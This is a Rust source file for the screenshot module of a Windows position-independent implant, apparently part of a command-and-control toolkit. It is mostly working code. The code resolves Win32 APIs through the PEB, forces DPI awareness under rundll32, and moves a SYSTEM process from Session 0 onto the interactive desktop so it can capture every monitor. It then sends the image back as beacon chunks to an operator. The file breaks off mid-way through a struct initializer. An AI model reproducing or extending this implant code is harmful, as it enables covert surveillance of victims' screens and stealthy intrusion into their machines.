//! Screen capture for the Windows PIC implant.
//!
//! `#![no_std]`, position-independent port of the dev agent's screenshot
//! command. Captures the full virtual desktop (all monitors) with GDI
//! hand-rolls a 32-bpp BGRA BMP, and streams it back as `Response::FileChunk`s
//! (128 KiB each, name `screenshot.bmp`) — NOT a single `Response::Image`,
//! because a full-screen BMP routinely exceeds the beacon's `MAX_CT_LEN` and the
//! beacon loop's BATCH_FLUSH framing is what keeps each chunk within a frame.
//!
//! `user32.dll` and `gdi32.dll` are force-loaded via the same
//! `LoadLibraryA`-from-kernel32 trick as [`crate::recon`] (Windows refcounts
//! module loads, so this is idempotent). All Win32 pointers use the x64
//! `"system"` ABI and are transmuted from the raw `usize` addresses the
//! [`crate::resolve::export_addr`] resolver returns.
//!
//! ## GDI handle hygiene
//! The implant is long-lived, so every DC/bitmap acquired here is torn down on
//! *every* path — success, partial failure, and resolution failure. The order
//! matters: a bitmap selected into a DC cannot be `DeleteObject`-ed until it is
//! deselected, so the previous object is restored first.

#![cfg(target_os = "windows")]

use crate::heap::{vec, String, Vec};
use crate::resolve::export_addr;
use core::ffi::c_void;
// Re-export Response so the test entry in entry.rs can match on its variants.
pub use nyx_protocol::Response;

// ---- Win32 / GDI constants -------------------------------------------------

/// `SRCCOPY` raster-op for `BitBlt` — copy the source rectangle verbatim.
///
/// Combined with [`CAPTUREBLT`] below (the `BitBlt` call uses `SRCCOPY |
/// CAPTUREBLT`), this also captures layered windows (`WS_EX_LAYERED`),
/// anti-aliased/UAC popups, hardware overlays, and fullscreen DX/GL
/// surfaces that plain `SRCCOPY` would skip — yielding only a corner or
/// missing regions of the screen.
const SRCCOPY: u32 = 0x00CC_0020;
/// `CAPTUREBLT` — includes layered + overlay windows in the `BitBlt` result.
/// OR'd into `SRCCOPY` so the capture covers every visible surface, not just
/// the main display plane.
const CAPTUREBLT: u32 = 0x4000_0000;
/// Virtual-screen metrics: the bounding rect of ALL displays combined.
/// SM_XVIRTUALSCREEN/SM_YVIRTUALSCREEN = top-left of the virtual desktop
/// (NEGATIVE when a secondary display sits to the left/above the primary —
/// this is the origin we pass to BitBlt as the source x/y). SM_CXVIRTUALSCREEN/
/// SM_CYVIRTUALSCREEN = total width/height of all monitors tiled together.
/// Using these instead of SM_CXSCREEN/SM_CYSCREEN captures every monitor in a
/// multi-display setup, not just the primary.
const SM_XVIRTUALSCREEN: i32 = 76;
const SM_YVIRTUALSCREEN: i32 = 77;
const SM_CXVIRTUALSCREEN: i32 = 78;
const SM_CYVIRTUALSCREEN: i32 = 79;
/// `DIB_RGB_COLORS` — the color table (none here) is raw RGB values.
const DIB_RGB_COLORS: u32 = 0;

/// Per-chunk size for the streamed BMP. Mirrors [`crate::fs::CHUNK`] (128 KiB),
/// safely under `protocol::frame::MAX_CT_LEN` so a single chunk + batch header
/// fits one beacon frame.
const CHUNK: usize = 128 * 1024;

/// Defensive cap on captured pixel count (~64 MB at 32 bpp). A real primary
/// screen is well under this; refusing anything larger guards against a
/// pathologically huge virtual screen or a bogus `GetSystemMetrics` return
/// driving a runaway allocation.
const MAX_PIXELS: usize = 16 * 1024 * 1024;

// ---- shared helpers -------------------------------------------------------

/// Force-load a DLL via the PEB-resolved `LoadLibraryA` (mirrors recon.rs:56).
/// Idempotent: Windows refcounts module loads, so this is safe to call on every
/// screenshot invocation without caching.
///
/// Returns `true` if the module is now mapped (or was already).
fn force_load(dll: &[u8]) -> bool {
    type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut c_void;
    let addr = match unsafe { export_addr(b"kernel32.dll", b"LoadLibraryA") } {
        Some(a) => a,
        None => return false,
    };
    // Build a NUL-terminated ASCII name on the stack (dll names here are short).
    let mut name = [0u8; 32];
    let n = dll.len().min(name.len() - 1);
    name[..n].copy_from_slice(&dll[..n]);
    let load: LoadLibraryA = unsafe { core::mem::transmute(addr) };
    // SAFETY: `name` is a valid NUL-terminated C string on the stack.
    let h = unsafe { load(name.as_ptr()) };
    !h.is_null()
}

// ---- DPI awareness --------------------------------------------------------

/// `HRESULT` from a DPI-set call when the awareness was already established
/// (by an earlier API call or by the EXE manifest — rundll32's case). Treated
/// as success, subject to the [`dpi_is_aware`] verification below.
const E_ACCESSDENIED_HR: i32 = 0x8007_0005u32 as i32;

/// Query the thread's effective DPI awareness via
/// `user32!GetDpiAwarenessContext` + `GetAwarenessFromDpiAwarenessContext`
/// (Win10 1607+). Returns true when the process is system- or per-monitor
/// aware — i.e. `GetSystemMetrics` yields PHYSICAL pixels. False when the
/// exports are missing (pre-1607 OS) or the process is still unaware.
///
/// This — not the setters' return codes — is the source of truth: every
/// setter fails with E_ACCESSDENIED once awareness exists, and a BOOL/HRESULT
/// alone can't distinguish that from a genuine failure.
fn dpi_is_aware() -> bool {
    type GetDpiAwarenessContext = unsafe extern "system" fn() -> *mut c_void;
    type GetAwarenessFromDpiAwarenessContext = unsafe extern "system" fn(*mut c_void) -> u32;
    let gdac: GetDpiAwarenessContext =
        match unsafe { export_addr(b"user32.dll", b"GetDpiAwarenessContext") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return false,
        };
    let gafdac: GetAwarenessFromDpiAwarenessContext =
        match unsafe { export_addr(b"user32.dll", b"GetAwarenessFromDpiAwarenessContext") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return false,
        };
    let ctx = unsafe { gdac() };
    if ctx.is_null() {
        return false;
    }
    // DPI_AWARENESS: 0 = unaware, 1 = system, 2 = per-monitor.
    let awareness = unsafe { gafdac(ctx) };
    awareness != 0
}

/// Set the calling THREAD's DPI awareness context to Per-Monitor V2
/// (`DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2` = (HANDLE)-4, Win10 1607+).
/// Returns the previous context for later restore, or `None` when the API is
/// missing or the call failed.
///
/// Why thread-level: the cross-session helper runs inside `rundll32.exe`,
/// whose manifest pins process awareness (system-aware). Process-level
/// setters then fail with E_ACCESSDENIED, and "system-aware" is NOT good
/// enough on an RDP session whose per-session scaling differs from the system
/// DPI (e.g. session at 200%, system at 96): GDI still virtualizes the
/// process and the capture comes back as a cropped top-left rect (verified on
/// the real target: a 2294x1438 desktop @200% returned as 1147x719 — exactly
/// half in both axes). The THREAD context overrides the manifest for every
/// GetSystemMetrics/GetDC/BitBlt made on this thread, yielding physical
/// pixels regardless of what the EXE declared.
fn set_thread_dpi_pmv2() -> Option<isize> {
    type SetThreadDpiAwarenessContext = unsafe extern "system" fn(isize) -> isize;
    let f: SetThreadDpiAwarenessContext = unsafe {
        core::mem::transmute(export_addr(b"user32.dll", b"SetThreadDpiAwarenessContext")?)
    };
    // Return value: the PREVIOUS context handle (non-zero) on success, NULL
    // on failure (e.g. invalid context value, or pre-1607 stub).
    let old = unsafe { f(-4) };
    if old == 0 {
        None
    } else {
        Some(old)
    }
}

/// Restore a thread DPI awareness context saved by [`set_thread_dpi_pmv2`].
/// Best-effort; only called when the set succeeded, so the export exists.
unsafe fn restore_thread_dpi(old: isize) {
    type SetThreadDpiAwarenessContext = unsafe extern "system" fn(isize) -> isize;
    if let Some(a) = unsafe { export_addr(b"user32.dll", b"SetThreadDpiAwarenessContext") } {
        let f: SetThreadDpiAwarenessContext = unsafe { core::mem::transmute(a) };
        unsafe { f(old) };
    }
}

/// Set the process DPI awareness so GDI calls return physical-pixel sizes.
/// Tries, in order:
/// 1. `user32!SetProcessDpiAwarenessContext(PER_MONITOR_AWARE_V2)` – Win10 1703+
/// 2. `shcore!SetProcessDpiAwareness(PROCESS_PER_MONITOR_DPI_AWARE)` – Win 8.1+
/// 3. `user32!SetProcessDPIAware()` – Vista/7
///
/// Per-Monitor V2 can ONLY be set via the tier-1 context API: shcore's
/// `SetProcessDpiAwareness` takes the `PROCESS_DPI_AWARENESS` enum (0/1/2
/// only), so the old code's `f(3)` returned E_INVALIDARG — and its inverted
/// `!= 0` check read that failure as success, leaving the process DPI-unaware
/// (the 1147x719-virtualized-crop bug). All checks below treat S_OK/0 as
/// success and re-verify via [`dpi_is_aware`].
///
/// **Must be called before any `GetDC` / `CreateCompatibleBitmap`**.
/// Best-effort: failure is silent (the capture proceeds with whatever the
/// system gives us), but on modern Windows this almost always succeeds.
fn set_dpi_aware() -> bool {
    // Already aware (manifest-declared, or set by a previous capture)? Nothing
    // to do — every setter would just fail with E_ACCESSDENIED.
    if dpi_is_aware() {
        return true;
    }
    // Tier 1 — Win10 1703+: DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2 =
    // (HANDLE)-4. Returns BOOL; on failure we re-query rather than trusting
    // GetLastError, so E_ACCESSDENIED (already set) is handled for free.
    if let Some(addr) = unsafe { export_addr(b"user32.dll", b"SetProcessDpiAwarenessContext") } {
        type SetProcessDpiAwarenessContext = unsafe extern "system" fn(*mut c_void) -> i32;
        let f: SetProcessDpiAwarenessContext = unsafe { core::mem::transmute(addr) };
        let _ = unsafe { f(-4isize as *mut c_void) };
        if dpi_is_aware() {
            return true;
        }
    }
    // Tier 2 — Win 8.1+: shcore enum API (2 = PROCESS_PER_MONITOR_DPI_AWARE).
    // S_OK(0) = set now; E_ACCESSDENIED = already set (also fine). shcore is
    // not guaranteed mapped, so force-load before resolving.
    if force_load(b"shcore.dll") {
        if let Some(addr) = unsafe { export_addr(b"shcore.dll", b"SetProcessDpiAwareness") } {
            type SetProcessDpiAwareness = unsafe extern "system" fn(u32) -> i32;
            let f: SetProcessDpiAwareness = unsafe { core::mem::transmute(addr) };
            let hr = unsafe { f(2) };
            if hr == 0 || hr == E_ACCESSDENIED_HR || dpi_is_aware() {
                return true;
            }
        }
    }
    // Tier 3 — Vista/7: system-DPI aware only. GetDpiAwarenessContext doesn't
    // exist that far back, so trust the BOOL here (it is FALSE only on a real
    // failure or when already set by manifest — and the dpi_is_aware pre-check
    // above already covers the already-set case on 1607+).
    if let Some(addr) = unsafe { export_addr(b"user32.dll", b"SetProcessDPIAware") } {
        type SetProcessDPIAware = unsafe extern "system" fn() -> i32;
        let f: SetProcessDPIAware = unsafe { core::mem::transmute(addr) };
        if unsafe { f() } != 0 {
            return true;
        }
    }
    // Last word: whatever state we actually ended up in.
    dpi_is_aware()
}

// ---- BITMAPINFOHEADER -----------------------------------------------------

/// Win32 `BITMAPINFOHEADER` (40 bytes). Plays three roles in the new capture
/// pipeline:
/// 1. The `BITMAPINFO` passed to `CreateDIBSection` — its `biWidth/biHeight`
///    fix the DIB's size in RAW PHYSICAL pixels (NOT the DC's logical coords,
///    which is where `CreateCompatibleBitmap` got DPI-virtualized into a
///    half-size crop). This is the size the resulting BMP will carry.
/// 2. The source of truth for the 40-byte info header emitted into the BMP
///    file body — BMP stores it verbatim, so we hand the same struct to both.
/// 3. `biHeight` is kept POSITIVE so the DIB surface is bottom-up — which
///    exactly matches BMP's bottom-up row order, so the pixels `CreateDIBSection`
///    maps (`ppvBits`) drop straight into the file body with no flip and no
///    second `GetDIBits` copy.
#[repr(C)]
struct BitmapInfoHeader {
    bi_size: u32,
    bi_width: i32,
    bi_height: i32,
    bi_planes: u16,
    bi_bit_count: u16,
    bi_compression: u32,
    bi_size_image: u32,
    bi_x_pels_per_meter: i32,
    bi_y_pels_per_meter: i32,
    bi_clr_used: u32,
    bi_clr_important: u32,
}

// ---- chunk streaming ------------------------------------------------------

/// Slice a complete buffer into `Response::FileChunk`s of `CHUNK` bytes, the
/// last one flagged `eof=1`. An empty input yields a single empty eof chunk so
/// the operator still sees completion (matches [`crate::fs::do_download`]'s
/// empty-file contract).
fn chunk_stream(data: Vec<u8>, name: &str) -> Vec<Response> {
    let name = String::from(name);
    let mut chunks: Vec<Response> = Vec::new();
    if data.is_empty() {
        chunks.push(Response::FileChunk {
            name,
            seq: 0,
            eof: 1,
            data: Vec::new(),
        });
        return chunks;
    }
    let total = data.len();
    let mut offset = 0usize;
    let mut seq = 0u32;
    while offset < total {
        let end = (offset + CHUNK).min(total);
        // The final slice carries eof=1; all earlier ones are eof=0.
        let eof = if end == total { 1 } else { 0 };
        chunks.push(Response::FileChunk {
            name: name.clone(),
            seq,
            eof,
            data: data[offset..end].to_vec(),
        });
        seq += 1;
        offset = end;
    }
    chunks
}

// ---- public entrypoint ----------------------------------------------------

/// Capture the screen and stream it back as 128 KiB `Response::FileChunk`s
/// (name `screenshot.bmp`).
///
/// `monitor` is accepted for forward-compat but currently ignored: the capture
/// uses the **virtual screen** (`SM_CXVIRTUALSCREEN`/`SM_CYVIRTUALSCREEN` +
/// `SM_XVIRTUALSCREEN`/`SM_YVIRTUALSCREEN`), so it captures ALL monitors tiled
/// into one bitmap, not just the primary. Single-monitor capture is complete
/// and is the only mode the engagement VPS (one display) exercises;
/// [`count_displays`] is provided as a diagnostic for multi-monitor hosts so
/// the operator can tell whether the virtual-screen capture is tiling more
/// than one physical display.
///
/// GDI sequence: GetDC → CreateCompatibleDC → CreateDIBSection(32bpp BI_RGB,
/// size from `BITMAPINFOHEADER.biWidth/biHeight`, NOT the DC's logical coords)
/// → SelectObject → BitBlt(SRCCOPY|CAPTUREBLT) → memcpy out of the DIB's mapped
/// `ppvBits` → assemble BMP → cleanup. Every DC/bitmap handle is released on
/// every return path; a leak here kills the long-lived implant.
/// Ownership bundle for the window-station switch performed by
/// [`attach_interactive`]. Passed by value to [`detach_interactive`] so the
/// restore + close happen against EXACTLY the handles this call opened — no
/// process-wide `static mut` state, no re-entrancy hazard.
///
/// CRITICAL-13 fix: the previous design stored these in `static mut
/// CAPTURE_WINSTA_ORIGINAL` / `CAPTURE_WINSTA_OPENED`, which broke under
/// re-entry (e.g. `count_displays` + `screenshot` in one cycle): the second
/// `attach_interactive` overwrote `ORIGINAL` with the *already-switched*
/// WinSta0 pseudo-handle, so `detach_interactive` restored to the wrong
/// station AND closed the borrowed `GetProcessWindowStation` pseudo-handle.
/// Passing the pair as locals makes every attach/detach self-contained.
#[derive(Clone, Copy)]
struct WinstaGuard {
    /// Handle saved from `GetProcessWindowStation` BEFORE switching. This is a
    /// BORROWED pseudo-handle owned by the process — [`detach_interactive`]
    /// MUST restore the process to it but MUST NOT `CloseWindowStation` it.
    original: *mut core::ffi::c_void,
    /// Handle from `OpenWindowStationW("WinSta0")`. This is an OWNED handle —
    /// [`detach_interactive`] closes it after restoring `original`.
    opened: *mut core::ffi::c_void,
}

/// Best-effort relocation to the interactive window station and desktop.
///
/// In Session 0 (SYSTEM service) the process is attached to a non-interactive
/// station (`Service-0x0-3e7$/Default`) with no GUI surface, so `GetDC(NULL)`
/// and `BitBlt` fail. This opens `WinSta0` and its `default` desktop and
/// attaches the current thread to them, so subsequent GDI calls see the
/// interactive session. Returns `Some(WinstaGuard)` on success (caller MUST
/// pass it to [`detach_interactive`]); `None` on any resolution/open failure
/// (nothing to clean up in that case). Best-effort — failures are silent (the
/// caller proceeds and surfaces the real GDI error).
///
/// # Safety
/// Resolves + calls user32 exports via raw pointers; all are idempotent/safe
/// in isolation (OpenWindowStationW/SetProcessWindowStation/OpenDesktopW/
/// SetThreadDesktop/CloseDesktop/CloseWindowStation).
//
// NOTE: the per-export `match export_addr(...) { Some(a) => transmute(a), None
// => return None }` blocks below are intentionally kept in match form (rather
// than `?`) for consistency with the rest of the crate (every other Win32
// resolver in screenshot.rs uses the same pattern). Clippy's question_mark
// suggestion only became applicable because this fn's return type changed from
// `bool` to `Option<WinstaGuard>` in the CRITICAL-13 fix; the style is
// preserved deliberately.
#[allow(clippy::question_mark)]
unsafe fn attach_interactive() -> Option<WinstaGuard> {
    type OpenWindowStationW = unsafe extern "system" fn(*const u16, i32, u32) -> *mut c_void;
    type GetProcessWindowStation = unsafe extern "system" fn() -> *mut c_void;
    type SetProcessWindowStation = unsafe extern "system" fn(*mut c_void) -> i32;
    type OpenDesktopW = unsafe extern "system" fn(*const u16, u32, i32, u32) -> *mut c_void;
    type SetThreadDesktop = unsafe extern "system" fn(*mut c_void) -> i32;
    type CloseDesktop = unsafe extern "system" fn(*mut c_void) -> i32;
    type CloseWindowStation = unsafe extern "system" fn(*mut c_void) -> i32;

    let ows: OpenWindowStationW =
        match unsafe { crate::resolve::export_addr(b"user32.dll", b"OpenWindowStationW") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return None,
        };
    let gpws: GetProcessWindowStation =
        match unsafe { crate::resolve::export_addr(b"user32.dll", b"GetProcessWindowStation") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return None,
        };
    let spws: SetProcessWindowStation =
        match unsafe { crate::resolve::export_addr(b"user32.dll", b"SetProcessWindowStation") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return None,
        };
    let odk: OpenDesktopW =
        match unsafe { crate::resolve::export_addr(b"user32.dll", b"OpenDesktopW") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return None,
        };
    let std: SetThreadDesktop =
        match unsafe { crate::resolve::export_addr(b"user32.dll", b"SetThreadDesktop") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return None,
        };
    let cd: CloseDesktop =
        match unsafe { crate::resolve::export_addr(b"user32.dll", b"CloseDesktop") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return None,
        };
    let cws: CloseWindowStation =
        match unsafe { crate::resolve::export_addr(b"user32.dll", b"CloseWindowStation") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return None,
        };

    // Save the process's current window station so detach_interactive() can
    // restore it AFTER the capture. Per MSDN, the handle returned by
    // GetProcessWindowStation is a BORROWED pseudo-handle owned by the process
    // and MUST NOT be closed — detach_interactive only restores via
    // SetProcessWindowStation, never closes this one.
    let original_winsta: *mut c_void = unsafe { gpws() };

    let mut winsta_name = crate::heap::Vec::<u16>::with_capacity(8);
    for &b in b"WinSta0\0" {
        winsta_name.push(b as u16);
    }
    let hwinsta = unsafe { ows(winsta_name.as_ptr(), 0, 0xC0_00_00_66) };
    if hwinsta.is_null() {
        // Nothing was switched and nothing was opened — no cleanup needed.
        return None;
    }
    if unsafe { spws(hwinsta) } == 0 {
        // SetProcessWindowStation failed — close the opened handle and bail
        // with no guard (the process is still on its original station).
        let _ = unsafe { cws(hwinsta) };
        return None;
    }

    // Open the default desktop and attach the thread.  The desktop handle is
    // closed immediately after SetThreadDesktop — the thread's assignment
    // keeps the desktop object alive (per MSDN).
    let mut desk_name = crate::heap::Vec::<u16>::with_capacity(8);
    for &b in b"default\0" {
        desk_name.push(b as u16);
    }
    let hdesk = unsafe { odk(desk_name.as_ptr(), 0, 0, 0xC0_00_00_66) };
    let _ok = if !hdesk.is_null() {
        let r = unsafe { std(hdesk) };
        let _ = unsafe { cd(hdesk) };
        r != 0
    } else {
        false
    };
    // DO NOT restore the original window station here — the caller needs
    // WinSta0 active for the GDI capture. detach_interactive() does the
    // restore + close using the guard we hand back. Returning the guard even
    // when SetThreadDesktop failed: the process IS switched to WinSta0, so the
    // caller must still detach to restore + close.
    Some(WinstaGuard {
        original: original_winsta,
        opened: hwinsta,
    })
}

/// Restore the original window station and close the WinSta0 handle opened
/// by [`attach_interactive`]. Must be called exactly once per successful
/// attach, with the [`WinstaGuard`] that attach returned. Takes the guard BY
/// VALUE — this is the crux of the CRITICAL-13 fix: every detach operates on
/// the exact handles its matching attach opened, so re-entrant or back-to-back
/// attach/detach pairs cannot overwrite each other's saved state.
///
/// CRITICAL-13: the previous design read shared `static mut` state, so a
/// second attach before the first detach clobbered `ORIGINAL` with the
/// already-switched WinSta0 pseudo-handle. The detach then (a) restored the
/// process to the WRONG station and (b) closed the borrowed
/// `GetProcessWindowStation` pseudo-handle (MSDN: must NOT be closed) — a
/// handle leak + UAF on the borrowed handle. With the guard passed by value
/// there is no shared state to clobber.
///
/// Safety contract on the guard handles:
/// - `guard.original` came from `GetProcessWindowStation` → BORROWED, restored
///   via `SetProcessWindowStation` but NEVER closed.
/// - `guard.opened` came from `OpenWindowStationW` → OWNED, closed via
///   `CloseWindowStation` AFTER the restore.
unsafe fn detach_interactive(guard: WinstaGuard) {
    type CloseWindowStation = unsafe extern "system" fn(*mut c_void) -> i32;
    let cws: CloseWindowStation =
        match unsafe { crate::resolve::export_addr(b"user32.dll", b"CloseWindowStation") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return,
        };
    type SetProcessWindowStation = unsafe extern "system" fn(*mut c_void) -> i32;
    let spws: SetProcessWindowStation =
        match unsafe { crate::resolve::export_addr(b"user32.dll", b"SetProcessWindowStation") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return,
        };

    // Restore the original window station BEFORE closing our WinSta0 handle.
    // Closing the active station is undefined behaviour (per MSDN), so the
    // restore must land first.
    if !guard.original.is_null() {
        let _ = unsafe { spws(guard.original) };
    }
    // Close ONLY the handle we opened (OpenWindowStationW). The `original`
    // pseudo-handle from GetProcessWindowStation is borrowed and must NOT be
    // closed (MSDN) — we deliberately do not touch it here.
    if !guard.opened.is_null() {
        let _ = unsafe { cws(guard.opened) };
    }
}

/// Count available displays via `EnumDisplayMonitors`. Diagnostic only —
/// screenshot capture (`capture_bmp` / `do_screenshot`) is single-virtual-
/// screen and captures every monitor tiled into one bitmap regardless of this
/// count; the engagement VPS typically has exactly one display, so this exists
/// purely so the operator can confirm "this host has N monitors, the capture
/// is/isn't tiling". Per-display selection (capturing a single named monitor)
/// remains unimplemented — multi-monitor target hosts are out of scope for the
/// current engagement.
///
/// Returns the monitor count on success, or 0 if user32 or
/// `EnumDisplayMonitors` could not be resolved. A 0 result is therefore
/// ambiguous (could mean "no monitors" or "resolver failed"); callers that
/// care about the distinction should check `selftest_display_count` instead,
/// which packs resolver-failure into a distinct exit code.
///
/// # Safety
/// Resolves + calls `user32!EnumDisplayMonitors` via raw pointers; the
/// callback is a static `extern "system" fn` that only increments a `Cell<u32>`
/// (no unwind, no allocation — `EnumDisplayMonitors`'s contract allows it).
pub unsafe fn count_displays() -> u32 {
    use core::cell::Cell;

    type EnumDisplayMonitors = unsafe extern "system" fn(
        hdc: *mut c_void,
        lprc_clip: *const c_void,
        lpfn_enum: unsafe extern "system" fn(*mut c_void, *mut c_void, *mut i32, isize) -> i32,
        dw_data: isize,
    ) -> i32;

    // user32 holds EnumDisplayMonitors; force-load so export_addr can find it
    // (idempotent — Windows refcounts module loads).
    if !force_load(b"user32.dll") {
        return 0;
    }

    let edm: EnumDisplayMonitors =
        match unsafe { export_addr(b"user32.dll", b"EnumDisplayMonitors") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return 0,
        };

    // The callback contract: return nonzero to continue enumeration, zero to
    // stop. We always return 1 — we want every monitor. The count lives in a
    // `Cell` referenced from a raw pointer passed via `dw_data` (the documented
    // pass-through channel for EnumDisplayMonitors → MonitorEnumProc).
    //
    // SAFETY of the transmute: `count_callback` has the exact
    // `MonitorEnumProc` signature from winuser.h, so the transmute is
    // signature-preserving (Rust just doesn't know that).
    unsafe extern "system" fn count_callback(
        _hmon: *mut c_void,
        _hdc: *mut c_void,
        _lprc: *mut i32,
        ldata: isize,
    ) -> i32 {
        let cell: &Cell<u32> = unsafe { &*(ldata as *const Cell<u32>) };
        cell.set(cell.get().saturating_add(1));
        1 // continue enumeration
    }

    let counter = Cell::new(0u32);
    // Pass a pointer to the counter cell through dw_data. The cell lives on
    // this stack frame for the duration of the EnumDisplayMonitors call (which
    // is synchronous — all callbacks fire before it returns).
    let ldata = &counter as *const _ as isize;
    let _ = unsafe { edm(core::ptr::null_mut(), core::ptr::null(), count_callback, ldata) };
    counter.get()
}

/// Core GDI capture: force-loads user32/gdi32, attaches to the interactive
/// desktop (same-session), captures the full virtual screen (all monitors),
/// into a BMP. `None` on any failure. Shared by `do_screenshot` (beacon path,
/// streams chunks) and `capture_to_file` (helper export, writes file).
///
/// Returns the BMP bytes plus `true` if DPI awareness was set successfully,
/// `false` if all three DPI APIs failed (the capture still proceeds but the
/// pixels BitBlt copies in may be scaled — the BMP SIZE is still correct, see
/// below; `do_screenshot` flags this in the chunk filename).
///
/// ## Why `CreateDIBSection` (not `CreateCompatibleBitmap` + `GetDIBits`)
///
/// The OLD pipeline did `CreateCompatibleBitmap(hdc, w, h)` → `BitBlt` →
/// `GetDIBits`. `CreateCompatibleBitmap` interprets `w/h` in the DC's LOGICAL
/// coordinate system, which is subject to DPI virtualization. Whenever the
/// three-tier DPI ladder below failed to stick (rundll32 manifest pinning
/// process awareness, RDP session scaling ≠ system DPI, pre-1607 hosts, or
/// BitBlt spanning monitors with different DPIs), the DDB came back at the
/// *logical* pixel count — a real 2294×1438 @200% desktop was captured as
/// 1147×719, exactly half on each axis. `GetDIBits` then faithfully read back
/// that already-shrunk DDB — the size error was locked in at allocation.
///
/// `CreateDIBSection` takes the size from the `BITMAPINFOHEADER` we hand it,
/// i.e. from `SM_CX/CYVIRTUALSCREEN` (raw physical pixels), NOT from the DC.
/// The allocation is DPI-independent by construction. Even in the worst case
/// (DPI ladder totally fails), the bitmap is still allocated at the physical
/// size; BitBlt may then copy a scaled image INTO it, but the BMP dimensions
/// are correct and the crop bug is gone.
///
/// ## Multi-version Windows adaptation
///
/// `CreateDIBSection` is available on Windows 2000+ — every supported target
/// (Server 2019 / build 17763, Win11 24H2 / build 26100, and everything in
/// between) ships it in gdi32. No version branching is needed for the capture
/// primitive itself. The DPI-awareness ladder above this call
/// (`SetProcessDpiAwarenessContext` PMv2 on 1703+ → `shcore!
/// SetProcessDpiAwareness` on 8.1+ → `SetProcessDPIAware` on Vista/7) already
/// covers the version matrix, and the thread-level PMv2 context override
/// handles the rundll32-hosted manifest-pinned case on 1607+.
fn capture_bmp() -> Option<(Vec<u8>, bool)> {
    if !force_load(b"user32.dll") || !force_load(b"gdi32.dll") {
        return None;
    }
    // Thread-level Per-Monitor-V2 FIRST (see set_thread_dpi_pmv2): overrides
    // the rundll32 manifest and is what GDI virtualization actually keys on.
    // Without it the process-level setters below can't save us on an RDP
    // session with per-session scaling ≠ system DPI.
    let old_ctx = set_thread_dpi_pmv2();
    // Process-level fallback for pre-1607 hosts. Must come BEFORE any
    // GetDC / CreateDIBSection.
    let dpi_aware = set_dpi_aware() || old_ctx.is_some();
    // CRITICAL-13: attach returns an owned WinstaGuard (or None if nothing was
    // switched). The guard is threaded through to detach so the restore+close
    // hits exactly these handles — no process-wide static state.
    let winsta_guard = unsafe { attach_interactive() };

    // Wrap in a closure so detach_interactive() runs on EVERY return path
    // (including the `?` early-returns from export_addr resolution).
    let result = (|| -> Option<(Vec<u8>, bool)> {
        type GetSystemMetrics = unsafe extern "system" fn(i32) -> i32;
        type GetDc = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
        type ReleaseDc = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
        type CreateCompatibleDc = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
        // CreateDIBSection signature:
        //   HDC hdc, CONST BITMAPINFO *pbmi, UINT usage,
        //   VOID **ppvBits, HANDLE hSection, DWORD offset
        // `usage` = DIB_RGB_COLORS (0). `hSection`/`offset` = NULL/0 (page-file
        // backed — the common case; we don't need a shared memory section).
        // Returns HBITMAP (NULL on failure) AND sets *ppvBits to the mapped
        // pixel buffer (NULL on failure). The returned HBITMAP owns the
        // mapping — DeleteObject releases it.
        type CreateDibSection = unsafe extern "system" fn(
            *mut c_void,
            *const BitmapInfoHeader,
            u32,
            *mut *mut c_void,
            *mut c_void,
            u32,
        ) -> *mut c_void;
        type SelectObject = unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void;
        type BitBlt = unsafe extern "system" fn(
            *mut c_void,
            i32,
            i32,
            i32,
            i32,
            *mut c_void,
            i32,
            i32,
            u32,
        ) -> i32;
        type DeleteObject = unsafe extern "system" fn(*mut c_void) -> i32;
        type DeleteDc = unsafe extern "system" fn(*mut c_void) -> i32;

        let gsm: GetSystemMetrics =
            unsafe { core::mem::transmute(export_addr(b"user32.dll", b"GetSystemMetrics")?) };
        let gdc: GetDc = unsafe { core::mem::transmute(export_addr(b"user32.dll", b"GetDC")?) };
        let rdc: ReleaseDc =
            unsafe { core::mem::transmute(export_addr(b"user32.dll", b"ReleaseDC")?) };
        let ccdc: CreateCompatibleDc =
            unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"CreateCompatibleDC")?) };
        let cds: CreateDibSection =
            unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"CreateDIBSection")?) };
        let so: SelectObject =
            unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"SelectObject")?) };
        let bb: BitBlt = unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"BitBlt")?) };
        let do_: DeleteObject =
            unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"DeleteObject")?) };
        let ddc: DeleteDc =
            unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"DeleteDC")?) };

        let vsx = unsafe { gsm(SM_XVIRTUALSCREEN) };
        let vsy = unsafe { gsm(SM_YVIRTUALSCREEN) };
        let w = unsafe { gsm(SM_CXVIRTUALSCREEN) };
        let h = unsafe { gsm(SM_CYVIRTUALSCREEN) };
        if w <= 0 || h <= 0 {
            return None;
        }
        let (w, h) = (w as usize, h as usize);
        let pc = w.checked_mul(h).filter(|&c| c <= MAX_PIXELS)?;
        let bytes = pc.checked_mul(4)?;

        // BITMAPINFOHEADER used as BOTH the CreateDIBSection input descriptor
        // AND the in-file info header. biHeight POSITIVE → bottom-up DIB, which
        // is exactly BMP's row order, so no flip is needed on the way to the
        // file body. biCompression = 0 (BI_RGB) — no color table follows.
        let bi = BitmapInfoHeader {
            bi_size: 40,
            bi_width: w as i32,
            bi_height: h as i32,
            bi_planes: 1,
            bi_bit_count: 32,
            bi_compression: 0,
            bi_size_image: (w as u32) * (h as u32) * 4,
            bi_x_pels_per_meter: 0,
            bi_y_pels_per_meter: 0,
            bi_clr_used: 0,
